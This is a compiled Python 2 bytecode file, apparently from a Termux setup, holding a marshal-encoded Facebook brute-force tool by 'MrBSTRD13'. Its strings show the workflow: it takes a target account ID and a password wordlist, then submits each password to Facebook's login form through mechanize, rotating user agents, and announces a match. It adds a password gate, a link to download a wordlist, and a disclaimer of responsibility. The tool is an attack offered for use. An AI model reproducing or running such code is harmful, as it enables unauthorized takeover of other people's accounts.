ó
Ð¡]c           @   s!   d  d l  Z  e  j d  d Ud S(   iÿÿÿÿNs  c           @   s/  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z e  j d  d  d l Z d  d l Z d   Z e d  e d  e d  e d  e  j d  e j d  e d	  e j d
  d GHd GHe	 d  Z
 e
 d k r"e d  e d  e j d  e  j d  n  e
 d k rbe d  e j d  e  j d  e j d
  n  xp e rÔd  d l Z e  j d  e j   Z e d k rºe  j d  e j d  Pqed GHe j d  d GHqeWd   Z e j d k süe j d k rtd Z d Z d Z d  Z d! Z d" Z d# Z d$ Z d Z d% Z d! Z d& Z d# Z e e e e e e f Z e j e  Z n  d'   Z  e    e! e	 e d( e d) e d*   Z" e! e	 e d( e d+ e d*   Z# d, Z$ d6 g Z% d/   Z d0   Z& d1   Z' d2   Z( d3   Z) d4   Z* e+ d5 k r+e&   n  d S(7   iÿÿÿÿNt   clearc         C   sG   x@ |  d D]4 } t  j j |  t  j j   t j d d  q Wd  S(   Ns   
g      ð?i
   (   t   syst   stdoutt   writet   flusht   timet   sleep(   t   st   c(    (    s   <s>t   waktu   s    s(   [36;1mWelcome to the world of hacking:)s>   [36;1mThis script for brute force work on Facebook accounts:)s   [36;1mDo not press any keys   [36;1mwait a moment...i   s+   [36;1mChoose No.1 to download the passwordi   s   [32;1m[1] Download passwords   [32;1m[2] Enter passwords   Enter selection : t   1s   [32;1mdownload passwords   [32;1mbrowser...i   s-   xdg-open https://www.file-up.org/nigxpnm55yg0t   2s   [32;1mpasswordt	   EGRAK2020i   s   password is not corect!!i   t    c         C   sG   x@ |  d D]4 } t  j j |  t  j j   t j d d  q Wd  S(   Ns   
g      $@id   (   R   R   R   R   R   R   (   R   R   (    (    s   <s>t   runntek4   s    t   linuxt   linux2s   [96;1ms   [34;1ms   [33;1ms   [32;1ms   [0;1ms   [31;1ms   [36;1ms   [34ms   [32ms   [31mc           C   sÍ   t  t d  t  t d  t  t d  t  t d  t  t d  t j d  t j d  d GHd	 GHt d
 t d GHt d t d GHt d t d GHt d t d GHt d t d GHd GHd GHd  S(   Ns$   I PLEASE BEFORE YOU USE THIS TOOLS:)s   This tool is very powerful:)sB   I am not responsible for any damage that might happen to someone:)s   OKy...s   Lets start...i   R    sú  [033;95m
     ââââââââââââââââââââââââââââââââââââââ 
     â       BRUTE FB BY:MrBSTRD13        â
     ââââââââââââââââââââââââââââââââââââââ
     |    âââââââââââââ¦â     ââââââââ     |
     |    ââââââââââââââ     âââ¦âââââ     |
     |    ââââââ â£âââââââ     âââ ââââ     |
     |    âââââââââââââ©â     ââ  ââââ     |
     |ââââââââââââââââââââââââââââââââââââ|
 t    s          AUTHOR : s    EGRAKs          Version : s    Premiums          FUNCTION : s    Hack Facebook Brute attacks
          >> s    DO NOT RECYME YESs    CAVE THE CAVE IT IS SO MUCHR   (   R   t   GLR   R   t   ost   systemt   R(    (    (    s   <s>t   coverL   s     s   [?]s    Enter ID Targets    : s    Type password.txts2   https://www.facebook.com/login.php?login_attempt=1sD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0s8   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geckc         C   sG   x@ |  d D]4 } t  j j |  t  j j   t j d d  q Wd  S(   Ns   
g      $@id   (   R   R   R   R   R   R   (   R   R   (    (    s   <s>R   f   s    c          C   sÅ   t  j   a t j   }  t j t  t j t  t j	 |   t j
 t  t j t  t j t  j j   d d t   t   t   d GHt t d  t t d  t j d  t d GHd  S(   Nt   max_timei   R   s   FAILURE FAILED........s#   CREATE AGAIN your password/Wordlists   [-_-] [-_-] [-_-] (   t	   mechanizet   Browsert   brt	   cookielibt   LWPCookieJart   set_handle_robotst   Falset   set_handle_redirectt   Truet   set_cookiejart   set_handle_equivt   set_handle_referert   set_handle_refresht   _httpt   HTTPRefreshProcessort   welcomet   lagit   searchR   R   R   R   t   WW(   t   cj(    (    s   <s>t   mainm   s     c         C   sã   t  j j t d j |    t  j j   d t j t  f g t	 _
 t	 j t  } t	 j d d  t t	 j d <|  t	 j d <t	 j   } | j   } | t k rß d | k rß d j |   GHd	 GHt t d
  t  j d  n  d  S(   Ns   [+]  Try........ {}s
   User-agentt   nri    t   emailt   passt   login_attempts@   [92;1m

[+][97;1m THIS IS A PASSWORD, YES[31;1m===> [96;1m{}R   s   ......ENTER PRESS TO EXIT.....i   (   R   R   R   t   Bt   formatR   t   randomt   choicet
   useragentsR   t
   addheaderst   opent   logint   select_formR.   t   formt   submitt   geturlt	   raw_inputt   CCt   exit(   t   passwordt   sitet   subt   log(    (    s   <s>t   brute   s    c          C   s@   t  t d  }  x* |  D]" a t j d d  }  t t  q Wd  S(   Nt   rs   
R   (   R7   t   passwordlistR@   t   replaceRD   (   t	   passwords(    (    s   <s>R)      s    c           C   s   t  d GHd  S(   Nsë  
     ââââââââââââââââââââââââââââââââââââââ
     â  BRUTE FB BY:MrBSTRD13   â
     ââââââââââââââââââââââââââââââââââââââ
     |    âââââââââââââ¦â     ââââââââ     |
     |    ââââââââââââââ     âââ¦âââââ     |
     |    ââââââ â£âââââââ     âââ ââââ     |
     |    âââââââââââââ©â     ââ  ââââ     |
     |ââââââââââââââââââââââââââââââââââââ|
      (   t   GG(    (    (    s   <s>R'      s    c          C   sU   t  t d  }  |  j   }  t d j t  GHt d Gt |   Gt d GHt d GHd  S(   NRE   s        [*] Account to crack : {}s        [*] TOTAL WORDLIST :RH   s+        [*] AGAIN CRACKING PLEASE WAIT .....

(	   R7   RF   t	   readlinesR   R2   R.   t   lenR*   R   (   t   total(    (    s   <s>R(      s
    t   __main__(   sD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0s8   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck(,   R   R   R   R   R3   R   R   R	   R   R=   t   pilihR    t   getpasst   sandiR   t   platformR   t   BBt   YYRI   R*   t   RRR>   R1   t   Yt   Gt   WR   t   Ct   randR4   t   PR   t   strR.   RF   R8   R5   R,   RD   R)   R'   R(   t   __name__(    (    (    s   <s>t   <module>   s   H	







				&&							(   t   marshalt   loads(    (    (    s6   /data/data/com.termux/files/home/facebook-brute@Rus.pyt   <module>   s   